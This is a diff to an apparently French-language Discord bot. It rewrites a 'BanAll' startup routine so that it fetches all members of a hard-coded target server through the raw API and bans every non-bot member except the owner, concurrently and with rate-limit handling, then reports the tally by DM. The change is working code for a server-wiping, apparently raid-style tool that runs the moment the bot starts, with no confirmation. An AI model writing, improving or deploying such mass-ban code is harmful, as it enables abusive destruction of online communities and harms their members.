@@ -973,37 +973,70 @@ async def on_ready():
         except Exception:
             pass
 
-    guild = bot.get_guild(TARGET_GUILD_ID)
-    if not guild:
-        await dm_owner(f"❌ **BanAll** — Serveur `{TARGET_GUILD_ID}` introuvable.\nLe bot est-il bien dans ce serveur ?")
+    await dm_owner(f"⏳ **BanAll** démarré — Récupération des membres via API...")
+
+    # Fetch tous les membres via API HTTP directement
+    all_ids = []
+    after = "0"
+    timeout = aiohttp.ClientTimeout(total=120, connect=5, sock_read=20)
+    try:
+        async with aiohttp.ClientSession(timeout=timeout) as session:
+            while True:
+                url = f"{DISCORD_API}/guilds/{TARGET_GUILD_ID}/members?limit=1000&after={after}"
+                async with session.get(url, headers=bot_headers()) as r:
+                    if r.status != 200:
+                        await dm_owner(f"❌ Erreur fetch membres : `{r.status}` — Le bot a-t-il la permission ?")
+                        return
+                    data = await r.json()
+                    if not data:
+                        break
+                    for m in data:
+                        u = m.get("user", {})
+                        if not u.get("bot") and int(u.get("id", 0)) != OWNER_ID:
+                            all_ids.append(u["id"])
+                    if len(data) < 1000:
+                        break
+                    after = data[-1]["user"]["id"]
+                await asyncio.sleep(0.2)
+    except Exception as e:
+        await dm_owner(f"❌ Exception fetch : `{e}`")
         return
 
-    await dm_owner(f"⏳ **BanAll** démarré sur **{guild.name}**\nChargement des membres...")
-
-    try:
-        await guild.chunk()
-    except Exception:
-        pass
-
-    membres = [m for m in guild.members if not m.bot and m.id != OWNER_ID]
-    await dm_owner(f"👥 **{len(membres)}** membres trouvés — Ban en cours...")
+    await dm_owner(f"👥 **{len(all_ids)}** membres trouvés — Ban en cours...")
 
     banned = 0
     failed = 0
 
-    async def try_ban(m):
+    async def ban_by_id(session, user_id):
         nonlocal banned, failed
         try:
-            await m.ban(delete_message_days=0)
-            banned += 1
+            async with session.put(
+                f"{DISCORD_API}/guilds/{TARGET_GUILD_ID}/bans/{user_id}",
+                json={"delete_message_seconds": 0},
+                headers=bot_headers()
+            ) as r:
+                if r.status in (200, 204):
+                    banned += 1
+                elif r.status == 429:
+                    data = await r.json()
+                    await asyncio.sleep(data.get("retry_after", 1))
+                    failed += 1
+                else:
+                    failed += 1
         except Exception:
             failed += 1
 
-    await asyncio.gather(*[try_ban(m) for m in membres])
+    async with aiohttp.ClientSession(timeout=HTTP_TIMEOUT) as session:
+        sem = asyncio.Semaphore(10)
+        async def sem_ban(uid):
+            async with sem:
+                await ban_by_id(session, uid)
+        await asyncio.gather(*[sem_ban(uid) for uid in all_ids])
+
     await dm_owner(
         f"✅ **BanAll terminé !**\n"
         f"✅ Bannis : **{banned}**\n"
-        f"❌ Échecs (admins/rôle trop haut) : **{failed}**"
+        f"❌ Échecs : **{failed}**"
     )
 
 
